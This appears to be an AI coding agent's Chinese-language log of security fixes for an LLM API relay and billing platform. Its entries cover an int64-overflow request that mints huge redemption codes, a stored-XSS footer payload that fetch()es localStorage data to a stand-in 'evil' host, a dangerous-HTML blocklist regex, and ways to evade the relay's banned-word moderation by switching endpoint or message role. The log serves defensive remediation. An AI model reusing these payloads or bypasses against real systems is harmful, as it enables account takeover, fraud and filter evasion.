- **根因**：两个从 yun 原样移植的程序化配件在我们的透明画布构图里穿帮。①白条=程序化**灯丝**（白色小圆柱 + Bloom 增亮），yun 里被密集点云与较小屏占掩住，我们的构图里裸露成光条；②黑框=**金属灯座**（暗色 `MeshStandardMaterial`，`transparent:true` 但 `depthWrite` 默认 `true`）：透明排序中它先绘制并写深度，把身后的加法粒子按 z 剔除，叠加「亮度转 alpha」合成（暗像素→低 alpha→透明）后，在发光底座上冲出圆柱侧影形状的硬边黑洞。yun 是不透明深底+屏占小，同一配件不显眼。
- **解决**：删除灯丝与金属灯座两个网格（点云自带灯泡+底座形状，核心喷发改由辉光+点光承担）；顺带给辉光 Sprite 补 `depthWrite:false`，防自旋时透明排序翻转打出同类方洞。
- **升级**：在「加法混合粒子 + 透明画布 + 亮度转 alpha」的场景里：装配用的辅助网格一律显式 `depthWrite:false`；暗色实体网格慎用（暗色=透明，只会以"剔除别人"的方式留下负空间）；从别的项目移植视觉装配时，逐件在**目标构图与目标屏占**下过目，不能只信来源项目的观感。

### [已解决] auto 统一分组对用户被 2D 计费"故意"禁用；vip/svip 折扣走层级轴而非 GroupGroupRatio
- **现象**：想让用户走 "auto" 一个统一入口自动路由 gpt-pro/gemini/kiro，但建 Key 下拉根本没有 auto；且一度以为 vip/svip 折扣要配「分组的分组倍率」(GroupGroupRatio)。
- **根因**：本 fork 装了 2D 计费旁路 `resolveModelGroup2D` 后，`relay/helper/price.go:HandleGroupRatio` 命中即 return、**绕过原生 GroupGroupRatio(对 /v1 计费是死代码)**；`controller/group.go:GetUserGroups` 又**故意把 auto 排除出下拉**(源码注释"2D 装配时也排除")。折扣其实挂在层级轴 `GroupRatio[vip]/[svip]`(线上 0.9/0.8)，用户选任意模型分组都生效、与 auto 无关。auto 另需 `options.UserUsableGroups` 含 "auto" 才过 `middleware/auth.go:413` 鉴权(否则 403「无权访问 auto 分组」)。
- **解决/规避**：移除 group.go 的 auto 排除守卫 + DB `UserUsableGroups` 加 `"auto":"自动(auto)"`(写库**必须 `mysql --default-character-set=utf8mb4`**，否则 latin1 连接把中文双重编码成乱码)。commit 722361c / deploy-20260714-020004；实测 group=auto 令牌 → /v1 gpt-5.5 → 200 命中 gpt-pro、计费正常。计费数学零改动。
- **升级**：记入 memory `billing-2d-and-auto-group`；DB 变更非 git，整库重建需重跑该 UPDATE。

### [已解决] 代理兑换码 int64 乘法溢出绕过唯一付费闸门（Critical，$0.001 铸天价额度）
- **现象**：`POST /api/tenant/redemptions {"amount_usd":997121301281.5974,"count":37}` 可让代理 owner 钱包只实扣 506 quota（≈$0.001），却铸出 37 张 × $997 亿面额的兑换码，兑换进自己名下用户后无限调 /v1，上游账单由平台承担；报表/对账全程"正常"（钱确实扣了、码确实入账了，破的是"面额从哪来"这个前提）。
- **根因**：`HandleAgentCreateRedemptions`（`internal/mtwire/distribution.go`）里 `amount_usd` **只有下界没有上界**，`perCode`（=usd×QuotaPerUnit）与 `Count`（≤1000）各自过校验，但二者乘积 `total := perCode * int64(Count)` **无 int64 溢出检查**——回绕成小正数（506）后穿过仓储层 `CreateCodesWithDeduction` 里 `totalQuotaUnits <= 0` 这道**代理唯一的付费闸门**。溢出发生在 **create 侧的 `perCode×count`**（不是 redeem 侧的 credit：单张面额受 `amount_usd decimal(20,8)` 列宽约束 ≤~$1e12 → perCode ≤~5e17 < int64 max，单码入账不溢出）。曾被三个子代理独立看漏：两个误信源码 `model/user.go` 的 `gorm:"type:int"` 判定 users.quota 是 INT32 会撞 MySQL 1264 回滚（**线上实为 bigint**，AutoMigrate 不收窄已存在列），一个把溢出位置错认在 redeem 侧 credit。**只有实测线上 schema + 亲自算穿整条链才定得了案**。
- **解决/规避**：纵深防御三闸——① 建码侧加面额上界 `maxRedemptionAmountUSD = 1_000_000`（正常业务远低于此，平台历史最大用户额 ≈$203；任何 <~$1.8e13 的上界都使乘积远离溢出边界）；② `total` 计算后加 int64 乘法溢出检测 `total/int64(Count) != perCode`（数学兜底，防日后调大上界）；③ `RedeemCodeAndCredit`（`internal/wallet/gormrepo/gormrepo.go`）入账前加 `amt > MaxInt64/quotaPerUnit` 兜底拒（前瞻性，防列宽放宽/旁路建码）。回归测试 `TestHandleAgentCreateRedemptions_RejectsOverflowMint`（精确利用载荷被拒、owner quota 分文不动、零码落库、界内合法请求仍放行）+ `TestRedeemCodeAndCredit_RejectsOverflowCredit`。服务器 golang:1.25.1 容器 `go build`/`go vet`/`go test ./internal/mtwire/ ./internal/wallet/...` 全绿。**代码仅在本地 git 工作树（未提交/未部署，待用户决定）**。
- **升级**：候选升级为硬约束——"一切'金额×数量/倍率'的 int64 乘法在校验后、落库前必须做溢出检测；面额/数量类入参一律双边界（下界+上界）"。待用户确认后填入 CLAUDE.md C 段；记入 memory `redemption-int64-overflow-mint`。

### [已解决] 自研 mt-router 全部路由旁路 /api 分组中间件——限流默认开着却对自研接口全失效（Critical，兑换码可爆破 / 回调可 OOM / 无限印钞可脚本化）
- **现象**：全局限流（`GLOBAL_API_RATE_LIMIT_ENABLE=true` 360/180s）与关键限流（`CRITICAL_RATE_LIMIT_ENABLE=true` 20/20min）默认都开着，但对所有自研 `/api/**` 端点**一条都不生效**。三条具体暴露：① `POST /api/tenant/redeem` 无限流→登录态每秒数千次爆破他人未用兑换码，`RedeemCodeAndCredit` 直接入账；② `POST /api/pay/wechat/notify`（+ alipay）公开未认证、无 `AnonymousRequestBodyLimit`→任意人 POST 1GB body，`VerifyNotify` 读全量→内存耗尽 OOM；③ `POST /api/tenant/wallet/recharge` 无限流→无限造 pending 订单（DoS + 支付表膨胀）。子代理复现独立 gin 工程实测：`/api/user/topup` apiRouter 中间件命中=1，`/api/tenant/redeem`=0（旁路）。
- **根因**：`router/main.go:20` 调 `SetMtRouter(router)` 传的是 `*gin.Engine`；`SetMtRouter` 内各组直接 `router.Group("/api/tenant"|"/api/pay"|"/api/admin/…")` 挂在 **engine** 上，是 `SetApiRouter` 里 `apiRouter := router.Group("/api")`（其 `.Use(RouteTag/gzip/BodyStorageCleanup/GlobalAPIRateLimit)`）的**兄弟组**而非子组。**gin 的 `Group()` 在创建时快照父链**，`apiRouter.Use(...)` 只追加到 apiRouter 自身 handler 链、**不按 URL 路径前缀继承**给别的组。engine 级只有 `CustomRecovery/RequestId/PoweredBy/I18n/Sessions`，无任何限流/体积门 → 上游同类端点（stripe/creem/waffo webhook 挂 anonymousRequestBodyLimit、user/topup 挂 CriticalRateLimit）全有保护，自研的一个都没挂。「限流没开」是误判，真相是「限流开着但对自研代码不生效」。
- **解决/规避**：`router/mt-router.go` 内建一个与 apiRouter **同基础链**的 `/api` 基组 `apiBase := router.Group("/api")` + `.Use(RouteTag("api") / gzip / BodyStorageCleanup / GlobalAPIRateLimit)`，把**全部** 15 个自研组（tenant / pay / internal-domain / agent-plans-public + 12 个 admin/*）从 `router.Group` 改挂 `apiBase.Group`（**URL 路径逐字节不变**——这些 path 本就已在 engine radix tree 里注册过，仅补齐 handler 链，零新增路径冲突风险；apiBase 与 apiRouter 双 `/api` 组注册的 leaf 互斥，单请求只命中一条链、不会双跑）。再补上游对等的靶向门：money 端点（redeem / wallet-recharge / token-plans&agent-plans purchase / withdrawals）加 `CriticalRateLimit()`（20/20min/IP，镜像上游 `/api/user/topup`，置于 UserAuth 之后）；公开回调（wechat/alipay notify）加 `anonymousRequestBodyLimit`（镜像上游 webhook）。注：redeem 未加 Turnstile——上游对等基准 topup 也只有 CriticalRateLimit，保持一致。**纯静态审查，未跑测试（用户指示）；本机无 Go 工具链，`go build`/`go vet` 待服务器验证。代码仅在本地 git 工作树。**
- **升级**：**已升级为规则 → CLAUDE.md C2**。凡通过 `SetMtRouter(*gin.Engine)` 等拿到 engine 的自研装配点，新增 `/api/**` 路由必须挂在与 apiRouter 同基础链的 `apiBase` 下（严禁直接 `engine.Group("/api/…")`），公开/money 端点再单独对齐上游靶向中间件；记入 memory `mt-router-bypasses-api-middleware`。

### [已解决] 代理自配页脚未净化经 dangerouslySetInnerHTML 渲染 → 存储型 XSS（Critical，可接管其名下终端用户账号）
- **现象**：`ValidatePatch`（`internal/siteconfig/policy.go`）逐字段校验 ThemePreset/ThemeColor/HomeMode 并显式锁死 CustomHTML（非空即 `HOME_MODE_LOCKED`，注释「一期锁定」），**但同一个 patch 上的 `Footer` 完全不进校验表**：`applyPatch` 原样 `cfg.Footer = *in.Footer` 落库 → 经**公开、无鉴权**的 `GET /api/tenant/current`（`internal/mtwire/http.go` 下发 `"footer": cfg.Footer`）吐出 → 前端 `use-tenant-brand.ts` 覆写 `footerHtml` → `footer.tsx:208` **裸 `dangerouslySetInnerHTML`、无 DOMPurify** 渲染。任意 `level≥1` 代理在「站点装修 → 页脚」填 `<img src=x onerror="fetch('//evil/?c='+localStorage.user)">` → 其名下**所有终端用户任意页面**（页脚在 layout 里）即刻执行 → 以受害者身份建 API token / 读页面上的 key / 改邮箱密码 / 转余额。三放大器：① 全仓无 CSP（内联 handler 可执行）；② payload 进 `localStorage`（system-config-store persist），网络请求前即渲染、服务端删库后受害者浏览器仍复现，极难应急止血；③ `withCredentials:true` + user 存 localStorage，可直接接管账号。边界（据实）：session cookie 是 `HttpOnly + host-only + SameSite=Strict`，裸 cookie 窃取与跨子域打主站被挡，影响限该代理自己的租户域内，非平台级接管。
- **根因**：`ValidatePatch` 采用「逐字段**白名单校验**」——凡未列入校验表的字段（Footer）就直接穿过 `applyPatch` 落库。这是**模式风险**（比这条 bug 本身更值得注意）：新增/遗漏字段即静默绕过既有安全决定（「代理不得注入任意 HTML」的决定明明已对 CustomHTML 生效，Footer 从同一端点绕过）。叠加渲染端 `footer.tsx` 是**唯一未消毒的代理字段 HTML sink**（其余 4 处 `dangerouslySetInnerHTML`：`html-content.tsx`/`markdown.tsx` 已走 DOMPurify、`chart.tsx`/`landing-react` 是静态 CSS）。
- **解决/规避**：纵深两层、零新依赖——**L1 渲染端（权威）** `footer.tsx` 复用仓库**已内置**的 `dompurify@3.4.11`：`safeFooterHtml = useMemo(() => footerHtml ? DOMPurify.sanitize(footerHtml) : '', [footerHtml])`，sink 改渲染 `safeFooterHtml`（连已持久化进 localStorage 的旧 payload 也在下次渲染被中和，破放大器②，无需删库即可止血）。**L2 端点（策略强制）** `policy.go` 给 `ValidatePatch` 补 `Footer` 校验：长度上限 `MaxFooterBytes=8KiB` + 危险模式黑名单 `footerDangerRe`（脚本/iframe/object/embed/style/link/meta/svg/base/form 标签、内联 `on<event>=` 事件处理器、`javascript:`/`vbscript:`/`data:text/html` 伪协议）→ 命中即返新错误码 `FOOTER_INVALID`（`errors.go`）；`service.Patch` 先 `ValidatePatch` 再落库，故 reject 真正回给客户端、存储不被触碰。良性 HTML（链接/加粗）仍放行。补 6 条表驱动单测（脚本/onerror/svg-onload/js-uri/iframe/超长）。**纯静态审查，未跑测试（用户指示）；本机无 Go 工具链，`go build`/`go test ./internal/siteconfig/` 待服务器验证。代码仅在本地 git 工作树。**
- **升级**：**已升级为规则 → CLAUDE.md C3**。安全铁律「默认拒绝」：凡代理可写且最终可能到达 HTML/JS sink 的自由文本字段，必须在 `ValidatePatch` 逐字段列举校验（不得默认放行），且渲染端必须 DOMPurify；新增此类字段（如公告若改 HTML 渲染）须同步两处。记入 memory `siteconfig-footer-xss-and-default-deny`。

### [已解决] 风控把基础设施错误当策略拒绝 → Redis 一宕机 /v1 全站 500（fail-closed，与代码自身契约相反，High）
- **现象**：`internal/mtwire/risk.go:38-39` 的设计契约白纸黑字写「best-effort：panic / DB 查询错误一律放行（绝不误杀正常流量）；仅确切命中状态/限流时返回 4xx」，但实现相反——**Redis 一宕机，三个域名的 `/v1` 100% 返 500，直到人工重启 redis**。客户端（codex/cursor）把 5xx 当临时错误狂重试，把单点故障放大成全站雪崩；且日志里**没有任何一行**说「风控因 Redis 不可用」，排障会先误查上游渠道。触发条件是例行运维事件（redis OOM / 镜像升级重启），非严格「正常操作」，故定 High（子代理判 Critical，主审员保守下调）——但影响面是全平台，是全篇第一优先级稳定性修复。
- **根因**：`risk.Engine` 故意把**基础设施错误**与**策略拒绝**压进同一个 error 返回通道（`engine.go:114-116` `n, err := e.kv.Incr(ctx, key); if err != nil { return err }` 返回裸 go-redis error）——这本身是 Engine 的**有意契约**（让调用方决定，有单测 `TestCheckCall_RPMIncrErrorPropagates` 固化：`errBoom` 必须原样上浮）。破在**边界层没有分流**：`mtwire/risk.go:63` 对 `CheckCall` 的任何 error 一律 `apperr.HTTPStatusOf(err)` 取码透传，而该函数（`apperr.go:52-57`）对**非 AppError 归一为 500**。策略拒绝（`ErrRateLimited`=429 / `ErrStatusForbidden`·`ErrIPNotAllowed`=403）都是 `*apperr.AppError` 自带 4xx，唯独裸 redis error 不是 → 归一 500 → fail-closed。生产装配（`wire.go:196-199` 只注入 kv + WithConfig，status/ips/rpm 全 nil）使这条路径**必然触发**：`CheckCall` 唯一实际动作就是 Redis INCR（`RISK_DEFAULT_RPM=60>0`，`engine.go:105` 的 `limit<=0` 短路不成立），唯一可能的 error 就是 Redis 错误。叠加 compose 里 redis **无 restart 策略**（点④，线上核实）→ 崩了不自愈 → 故障窗口 = 到人工介入为止。
- **解决/规避**：修在**边界层**（`mtwire/risk.go` 的 `checkCallHook`），不动 Engine（保住其「原样上浮」契约与单测）——这样一处修复覆盖 `CheckCall` 路径**全部**基础设施错误源（Redis INCR + IP allowlist 后端 + RPM resolver + 状态点查），而非只补 `engine.go:114` 一行。按 HTTP 码分流：`status := apperr.HTTPStatusOf(err)`，仅 `400≤status<500`（确切策略）才 `NewErrorWithStatusCode` 拦截透传；否则（基础设施错误 → 归一 500）`common.SysError(...)` **补上缺失的那行排障日志** 后 `return nil` **fail-open 放行**。良性效果：Redis 宕机时限流暂失效（可接受，best-effort 契约本就允许），但 /v1 正常流量不被误杀。**纵深防御**再给 compose 的 `redis`/`mysql` 补 `restart: unless-stopped`（此前只有 app 有，数据服务崩了需人工介入）——缩短「限流暂失效」窗口。**纯静态审查，未跑测试（用户指示）；本机无 Go 工具链，`go build`/`go test ./internal/mtwire/` 待服务器验证。代码仅在本地 git 工作树。**
- **升级**：候选规则——「基础设施错误（缓存/DB/网络后端）与业务策略拒绝必须分流：best-effort 旁路组件（风控/限流等）遇基础设施错误一律 fail-open 放行且留痕日志，绝不 fail-closed 用 5xx 阻断正常流量；边界层透传 error 前必须判别『是确切策略 AppError 还是裸基础设施错误』」。待用户确认后填入 CLAUDE.md C 段。

### [已解决] 违禁词扫描只覆盖 2/11 种请求格式、只扫最后一条 user 消息 → 换端点或换角色即完全绕过（Critical，同 Footer XSS 的「白名单挑选=遗漏即绕过」模式）
- **现象**：`internal/mtwire/moderation.go` 的抽取层 `extractUserMessages` type switch **只有 2 个 case**（`*dto.GeneralOpenAIRequest` / `*dto.OpenAIResponsesRequest`），其余一律 `default: return nil` **静默放行**（注释自认「其它格式 claude/gemini/embedding 暂不扫描，MVP 按需补」）；且 `userMessagesFromChat` **只取最后一条 role=="user" 消息**，system/assistant/tool/靠前的 user 全不扫，OpenAI 自己的 `prompt/input/instruction/prefix/suffix` 字段也全不扫。三条真实绕过：① 把 `POST /v1/chat/completions` 的请求体原样改发 `POST /v1/messages`(Claude)+`anthropic-version` 头——同模型/同 prompt/同渠道，扫描器一个字节没看到；② `POST /v1/images/generations {"prompt":"<违禁>"}` 从来没进过审核；③ 即使修完 ①，`{"messages":[{"role":"system","content":"<违禁>"},{"role":"user","content":"继续"}]}` 仍放行（违禁内容藏在 system/靠前轮次即漏）。CLAUDE.md 却把违禁词屏蔽标为「✅ 已建成·非待办」——文档与 MVP 现实矛盾。
- **根因**：**同 Footer XSS（#315）的模式风险**——抽取层用「按已知白名单挑」（挑 2 种类型、挑末条 user、挑 messages 字段）做安全判定的输入采集：凡未列入的格式/角色/字段就静默逃逸。注释给「只扫末条 user」的理由是「多轮历史已在各自轮次扫过」，但 **`/v1` 是无状态 HTTP，服务端无从判断历史是否真经过本平台**（攻击者可任意伪造 messages 数组），该前提不成立。次要点：扫描器侧还有第二道 role 过滤 `service.go:scannable()`（仅放行 `""`/`"user"`），但那是扫描器**契约**（由 `service_test.go:TestScan_OnlyUserRole` 固化「system/assistant 不扫」），真正的 bug 全在抽取层——`moderation.Message.Role` 的语义是「是否已判定为可扫描的用户输入」，不是原始 OpenAI role。
- **解决/规避**：**只重写抽取层**（`moderation.go`），扫描器与其测试零改动（最小爆炸半径、保 `TestScan_OnlyUserRole` 绿）。安全原则改为「无状态 relay 里请求体内一切客户端提供的文本都是入站用户输入」——`extractUserMessages` 覆盖**全部 11 种**会到达 hook 的 `dto.Request` 具体类型（OpenAI/Responses/**Compaction**/Claude/Gemini `chat`+**embed**+**batchEmbed**/Image/Audio/Embedding/Rerank；比 finding 列的 8 种多补 3 种同类未扫格式），**不分 role、不分位置**全部抽取，统一标 `Role:"user"` 交扫描器（在抽取层把 system/assistant/tool 重标为可扫描 user，而非放宽扫描器 role 契约）。新增 helper：`textsToUserMessages`/`anyTexts`（prompt/input/prefix/suffix 的 `any`→string 数组）/`rawTexts`（`json.RawMessage`）/`openAIMessageTexts`（全 message 全 role）/`responsesInputTexts`（全项）/`claudeTexts`（system+prompt+全 messages，用 `GetStringContent`/`ParseSystem`）/`geminiChatTexts`+`geminiContentTexts`（systemInstruction+全 contents+批量子请求）/`rerankTexts`（query+documents，字符串与 `{text}` 对象皆取）。**已知权衡**：多轮历史现在每轮全扫，remind 级词会对后续每轮重复记一次违规（record 噪声）——用「全覆盖不可绕过」换「remind 级重复记录」，可接受；block 级违禁内容本就该无论落在请求体何处、每轮都拦。**纯静态审查，未跑测试（用户指示）；本机无 Go 工具链，`go build`/`go test ./internal/mtwire/` 待服务器验证；代码仅在本地 git 工作树（分支 500L）。**
- **升级**：候选规则——「**安全扫描/校验的输入抽取必须默认全覆盖**：凡遍历请求的多态类型 / 多字段 / 多角色做安全判定（违禁词、鉴权、注入检测等）的抽取层，对未识别的格式/字段/角色必须按『可能含未扫内容』**保守处理**（要么覆盖、要么显式标注为未覆盖风险并留痕），**绝不 `default: return nil` 静默放行**；`/v1` 无状态，不得假设『历史已在别处扫过』」。与 **C3**「`ValidatePatch` 默认拒绝」同源（白名单挑选=遗漏即绕过）。待用户确认后填入 CLAUDE.md C 段；同步 memory `moderation-scan-format-role-bypass`，并可据此把 CLAUDE.md 待办看板「违禁词屏蔽 ✅ 已建成」的措辞更正为「格式/角色全覆盖已补齐（原 MVP 仅 2/11 格式）」。

### [已解决] Trial 三维去重的实名/设备维度并发失效：SetNX 返回值被丢弃，"强制"只在串行下成立 → 同设备/同实名多账号并发可各领一份 Trial（防刷唯一控制被绕过，Critical）
- **现象**：`internal/risk/engine.go` 的 `checkTrialLimit` 契约（`port.go:18`）承诺「Trial = 用户∪实名∪设备各 1 次（三维去重，并发单赢家）」，实测**并发下失效**。子代理跑临时 barrier 测试（32 goroutine 各持不同 userID + 共用一个 `DeviceID`，同时释放，200 轮，MemKVCache）→ **16/200 轮授予了 2 份 Trial（8% 绕过率）**；生产装配（`wire.go:197` 是 `RedisKVCache`，Get→SetNX 之间 ~6 次网络往返、窗口宽几个数量级）实际绕过率**远高于 8%**（未实测，标 Suspected）。真实攻击：注册 N 个账号（本就要注册），从同一设备/实名脚本化**并发**发起 N 次 Trial 购买 → 约拿 N 份免费 Trial。三维去重是 Trial 防刷的**唯一**控制（proposal §2.4），等于洞开。
- **根因**：旧实现是 **Get 预检 + 仅 userK 作决胜锁**：①`169-179` 对 `[userK, realK, devK]` 逐个 `Get`——纯读、无原子性；②`182` 只 `SetNX(userK)` 决胜，而 **userK 每个用户都不同、跨账号根本不串行化任何东西**；③`191-196` 对 realname/device 维度 `_, _ = e.kv.SetNX(...)` **把返回值丢弃**，注释还自称「best-effort：Get 预检已做强制」——但 `170-179` 的 Get 与 `182` 的 SetNX 之间没有原子性，该注释是误导源。交错时序（A=1、B=2、共用 dev1）：T1/T2 两者 Get(dev) 都 not-found → T3/T4 各 SetNX 自己不同的 userK 都 true（都"赢"）→ T5 A SetNX(devK)=true 丢弃、T6 B SetNX(devK)=false 丢弃 → **两人都返回 nil 拿到 Trial**。realname/device 维度的 SetNX 本是唯一能决胜的原子原语，却被弃用。现有测试没抓到：`engine_test.go:329` `TrialConcurrentSingleWinner` 把 64 个 goroutine 全钉死 `userID=7`，只证明了 userK 锁；`:298` `TrialDeviceDedup` 是两次**串行**调用，正是 Get 预检唯一有效的场景。
- **解决/规避**：**删掉非原子的 Get 预检**，改为对 `[userK, realK, devK]` 逐维 `SetNX` 决胜——**每个维度的返回值都参与判定，任一维度 SetNX 返回 false（已被占用）即拒**。`SetNX` 是原子 check-and-set，故并发下每个**共享**维度（同实名/同设备）只有 1 个请求占用成功，其余全判负 → 单赢家从"仅 userK"扩到"三维任一"，堵死窗口。键顺序 `[用户, 实名, 设备]` **有意为之**：同用户并发重复请求在第一步 userK 即判负、不留痕；只有"跨账号共享实名/设备"的败者才会在自身用户维度留下占用。**已知权衡**：`KVCache` 接口无删除原语（只有 `Incr/Get/SetNX/Expire`），无法对败者已占的维度做补偿删除（回滚），故败者可能在自身 userK 留"僵尸占用"——但（a）留痕方向 **fail-closed**（趋向拒绝更多 Trial），与 Trial 终身限购（`PurchaseDedupTTL=0`）语义一致；（b）**单一身份的正常用户永不被误封**（要留痕必须先过自己的 userK 又撞了他人的实名/设备，即已与既得 Trial 撞库/撞设备的账号，正是反刷要收紧的对象）。两个现存测试（串行 DeviceDedup、同用户并发 SingleWinner）在新代码下**仍通过**，无需改动。**纯静态审查，未跑测试（用户指示）；本机无 Go 工具链，`go build`/`go test ./internal/risk/` 待服务器验证；代码仅在本地 git 工作树（分支 500L）。**
- **升级**：候选规则——「**并发去重/限购的『强制』只能建立在原子原语的返回值上，不能靠先 Get 后 Set 的两步**：任何声称『并发单赢家/唯一性』的多维约束，其每个**跨主体共享**的维度都必须用原子 check-and-set（SetNX/唯一索引/CAS）作决胜并**检查返回值**；纯 Get 预检 + 丢弃 SetNX 返回值 = 只在串行下成立、并发即绕过。注释若宣称『已强制』必须指向真正串行化跨主体的那个原子操作」。与 **C2/C3** 同为「安全控制被静默旁路」家族（此处是并发窗口而非中间件/白名单）。待用户确认后填入 CLAUDE.md C 段；建议补一个**跨账号并发**测试（N goroutine 各持不同 userID + 共用 device，barrier 齐放，断言恰 1 份 Trial），补齐现有测试只覆盖"串行去重 + 同用户并发"的盲区。同步 memory `trial-dedup-setnx-discarded-concurrent-bypass`。

### [已解决] Trial 终身限购的真源在**无持久卷**的 Redis，且**下单即消耗、结构上无释放路径** → 双向都坏：误杀正当买家不可恢复 + 容器重建全站限购归零（Critical）
- **现象**：两个方向同时坏。① **误杀且不可恢复**：`internal/tokenplan/subscription.go:61` 在 `:72` `CreateOrder` **之前**就调 `CheckPurchaseLimit`——用户一点开 ¥6.90 Trial 收银台就 `SetNX` 写三维永久去重键（`engine.go:checkTrialLimit`，`PurchaseDedupTTL=0`），而 `KVCache` 端口只有 `Incr/Get/SetNX/Expire`、**无 `Del`** → 犹豫关掉、没付款就走了 → 终身限购已消耗、他（及撞其 device/realname 的账号）永远买不了 Trial，后台零手段，客服只能直连 Redis 删键。② **整体抹掉**：`deploy/docker-compose.test.yml` 的 redis 服务**无 `volumes:`**（顶层只声明 `mysql_test_data`），RDB/AOF 写向随容器蒸发的 `/data`，而限购在 DB **无任何后备台账** → 某次 `docker compose down` / `redis:latest` 被重新拉取 / 手工 `docker rm` → 全站终身限购一次性归零，所有历史买家可再薅一份，无日志无告警。主审员线上只读实测坐实：`docker inspect …redis… .Mounts → []`（无卷）、`CONFIG GET dir → /data`（随容器销毁）、`--scan risk:trial:* | wc -l → 0`（零键）与 `SELECT COUNT(*) FROM tokenplan_subscriptions → 1`（确有真实订阅）并存——状态确凿。
- **根因**：**关键不对称**——余额丢 Redis 只丢 ≤5s（`BATCH_UPDATE_INTERVAL=5`，MySQL 是持久后备），而限购丢 Redis **丢全部**（无后备）。两处结构性缺失叠加：(a) 限购**权威只在 Redis**、且该 Redis **无持久卷**；(b) `KVCache` 只增不删（无 `Del` 原语）→ 释放在**类型层面**不可能，`engine.go` 注释自己也承认"无删除原语，无法补偿删除"。据实说明成因未坐实那部分：`deploy.sh:106` 用 `up -d --build`（无 `--force-recreate`）→ **常规部署不会重建 redis 容器**；触发归零需 `compose down` / 镜像重拉 / 手工 `rm`。线上 0 键与 1 笔真实订阅并存是状态事实，具体哪次操作清的键**未坐实**。
- **解决/规避**：按用户定的**最小止血**范围（保持"下单即消耗"的时机不变、不碰支付/退款流、不加迁移列）——**缺陷①：补 `Del` 原语 + 后台审计释放通道**。`KVCache` 接口加 `Del(ctx, keys...)`（幂等），`RedisKVCache`（`r.rdb.Del`，空列表短路防 go-redis panic）与 `MemKVCache`（`delete(map)`）各补实现；`kvErrOn` 测试假实现用接口嵌入 → 自动透传、零改动。`risk` 包新增 `PurchaseLimitAdmin` 契约（`ReleaseTrialLimit` / `ReleasePurchaseLimit`），`*Engine` 实现（删 `trialKey(user∪realname∪device)` / `purchaseKey`，与建键口径对称）。`internal/mtwire/risk_admin_http.go` 新增 `HandleAdminReleaseTrialLimit`：`POST /api/admin/risk/trial-limit/release`（**AdminAuth**，`router/mt-router.go` 挂 `apiBase` 遵守 C2），入参 `{user_id, realname_id?, device_id?, plan_id?}`，经 `a.RiskEngine.(risk.PurchaseLimitAdmin)` 类型断言（Redis 关时 nil → 明确报 `RISK_ENGINE_UNAVAILABLE`，不 panic），释放后 `common.SysLog` 留痕"operator=… target_user=… scope=…"——**替代无密码/无卷/无审计的直连删键，补上鉴权 + 审计缺口**。**缺陷②：Redis 加持久卷 + AOF**。compose 的 redis 加 `volumes: - redis_test_data:/data` + `command: redis-server --appendonly yes`（顶层补 `redis_test_data:`）→ 键跨容器重建 / `down` / 镜像重拉存活，仅 `down -v` 清；AOF everysec 崩溃至多丢 ≤1s，与 RDB 并存双保险。**纯静态审查，未跑测试（用户指示）；本机无 Go 工具链，`go build`/`go vet`/`go test ./internal/risk/ ./internal/mtwire/` 待服务器验证。代码仅在本地 git 工作树（分支 500L）。**
- **权衡（据实，不夸大）**：本轮按用户选择做的是「**可恢复**（recoverable）」而非「**预防**（prevent）」——① 误杀**仍会发生**（下单即消耗未改），但从"永久不可解"变为"后台一键释放（带鉴权+审计）"；根治式"把消耗移到支付成功后"需持久化 device/realname 进待支付快照 + 处理"已付款却并发判负→退款"边界（碰钱流+迁移），用户明确选择暂不做。② Redis 卷+AOF 是**基建持久化**，非 DB 权威后备；"限购以 `tokenplan_subscriptions` 为权威、Redis 仅快取"的更强方案同样暂缓。③ 本 compose 改动**需一次 redis 容器 recreate 方生效**，重建瞬间旧内存键会丢——线上现状本就 0 键，故无损失，但部署时须知悉。
- **升级**：**已升级为规则 → CLAUDE.md C4**。红线：任何"终身/不可逆"的风控去重/限购键，其权威必须有**持久后备**（DB 台账，或至少持久卷 + AOF 的 Redis），且必须提供**释放原语 + 带鉴权与审计的后台释放通道**——"只增不删 + 无持久"= 既误杀不可解、又可被容器重建一次性抹平。同步 memory `trial-limit-redis-no-volume-no-release`；与 #333（同为 Trial 限购/`KVCache` 无删除原语家族）互为上下文。

### [已解决] AGT 代理套餐（全站最贵 SKU）零对账兜底：对账循环只跑 RCG/SUB 三路径，AGT 静默永停 pending、无页面可见、无告警（结构性缺口，非已发生的资金损失）
- **现象**：`runReconcileAll`（`reconcile_orchestrate.go`）只跑 RCG-paid ① / RCG-created ② / SUB ③ 三条路径，**AGT（代理套餐 ¥990–9990，全站客单价最高）一层保护都没有**：主动查单对账 ❌ / 超时置终态 ❌ / 管理员卡单列表 ❌ / 异常告警 ❌（仅支付回调 ✅）。RCG/SUB 均有前四层。代码自己承认（`agent_plan_bridge.go` 旧注释「AGT 无对账兜底」）。且 `payment_overview.go` 只查 `payment_orders` 表，AGT/SUB **都不在**该表（各自独立表），故管理员在任何页面都看不到 AGT 卡单。主审员线上只读取证：`SELECT status,COUNT(*),SUM(amount_cny) FROM mt_agent_plan_orders GROUP BY status` → 仅 4 笔 pending / ¥3960、无 activated；4 笔均 ¥990、slug 全空、2026-07-04 12:08–12:10 的 90 秒内连发——形态似测试下单。**据实说明**：pending≠已付款（CLAUDE.md 记录 07-03 曾把 24 笔 pending 误判为「回调失败」，商户平台截图交叉核实全是「下单没付」的废单）；是否真丢钱须查微信/支付宝商户后台，超出代码审计可及范围。本条认定的是**结构性缺口（代码层坐实）**，非已发生的资金损失（不沿用 07-14 审计「钱收了」的无佐证定性）。
- **根因**：AGT 桥接（`agent_plan_bridge.go`）落地时只接了「支付回调 → `ActivatePaidAgentPlanOrder`」这一条主链，从未接入对账编排。真实失败场景（与是否已发生无关）：api_v3_key 轮换配错 → 24h 内全部回调验签失败 → RCG/SUB 被对账循环持续查单并在卡单页可见、失败即告警，而 AGT 会静默永停 pending，无任何页面可见、无任何告警，唯一发现途径是有人手工 `SELECT * FROM mt_agent_plan_orders`。
